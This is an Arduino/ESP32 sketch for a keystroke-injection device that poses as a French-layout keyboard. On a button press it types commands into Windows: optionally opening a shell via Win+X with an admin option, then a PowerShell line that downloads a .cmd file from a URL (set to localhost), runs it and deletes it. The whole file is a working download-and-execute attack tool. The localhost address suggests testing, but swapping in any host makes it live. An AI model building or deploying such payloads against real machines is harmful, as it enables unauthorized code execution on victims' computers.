#include "Keyboard.h"
#include "Keyboard_fr_FR.h"

#define WAIT delay(100)
#define WAIT_LONG delay(1000)

#define LAUNCH_CMD (0)
#define ADMIN (0)

#define URL "http://localhost:9000/test.cmd"
#define FILENAME "test.cmd"

const int buttonPin = 3;
const int ledPin = 13;

bool flag = false;

void setup() {
  // put your setup code here, to run once:

  WAIT_LONG;
  pinMode(buttonPin, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);

  Keyboard.begin(KeyboardLayout_fr_FR);

  Serial.begin(115200);
  Serial.println("Sending <Esc> key to trigger the keyboard detection");

  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  WAIT;

  Serial.println("Ready. Press the button to send the payload");
}

void loop() {
  // put your main code here, to run repeatedly:
  
  if (digitalRead(buttonPin) == LOW) {
    // Wait in case we were trying to program the ESP32
    digitalWrite(ledPin, HIGH);
    delay(100);
    digitalWrite(ledPin, LOW);
    delay(1000);
    digitalWrite(ledPin, HIGH);

    if (flag == false) {
      Serial.println("Button pressed, sending payload...");

      #if LAUNCH_CMD
      // Win + X
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('x');
      Keyboard.releaseAll();
      
      WAIT_LONG;

      #if ADMIN
      // A
      Keyboard.press('a');
      Keyboard.releaseAll();
      #else
      // I
      Keyboard.press('i');
      Keyboard.releaseAll();
      #endif

      WAIT_LONG;
      WAIT_LONG;
      #endif

      // cd to the current user's Downloads folder
      Keyboard.println("cd %USERPROFILE%\\Downloads");

      WAIT;

      // Download and execute the payload (windows, cmd, http://localhost:9000/test.cmd)
      Keyboard.println("powershell -c \"Invoke-WebRequest -Uri '" URL "' -OutFile '" FILENAME "'\" && " FILENAME " && del " FILENAME);

      Serial.println("Payload sent");
      flag = true;
    }
  } else {
    digitalWrite(ledPin, LOW);
    flag = false;
  }
  
  delay(10);
}
